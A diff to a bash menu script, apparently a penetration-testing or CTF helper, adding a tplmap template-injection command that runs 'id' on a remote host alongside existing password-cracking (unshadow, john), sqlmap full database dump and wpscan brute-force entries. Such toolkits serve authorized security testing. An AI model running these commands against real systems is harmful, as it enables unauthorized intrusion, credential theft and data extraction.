@@ -64,6 +64,7 @@ COMMAND_b7="unshadow passwd shadow > key.hash"
 COMMAND_b8="john key.hash --wordlist=$``W_PASSWORD --format=FORMAT"
 COMMAND_b9="sqlmap --dump-all --tamper=space2comment --dbms=mysql -r BURP_REQUEST_FFILE"
 COMMAND_ba="wpscan -v --passwords $``W_PASSWORD --usernames $``USER --url http://${RHOST}"
+COMMAND_bb="~/Tools/tplmap/tplmap.py -u http://${RHOST}/ -d 'FIELD_NAME' --os-cmd 'id'"
 
 COMMAND_d1="binwalk -e file.jpg"
 COMMAND_d2="steghide extract -sf file.jpg"
@@ -160,6 +161,7 @@ show_menus() {
   echo -e "  ${YELLOW}b8${NOCOLOR}) $COMMAND_b8"
   echo -e "  ${YELLOW}b9${NOCOLOR}) $COMMAND_b9"
   echo -e "  ${YELLOW}ba${NOCOLOR}) $COMMAND_ba"
+  echo -e "  ${YELLOW}bb${NOCOLOR}) $COMMAND_bb"
   echo -e ""
   echo -e "  ${LIGHTGREEN}Decoding/Extracting${NOCOLOR}"
   echo -e "  --------------------"
@@ -428,6 +430,8 @@ read_options() {
     b7) runV $COMMAND_b7;;
     b8) runV $COMMAND_b8;;
     b9) runV $COMMAND_b9;;
+    ba) runV $COMMAND_ba;;
+    bb) runV $COMMAND_bb;;
 
     d1) runV $COMMAND_d1;;
     d2) runV $COMMAND_d2;;
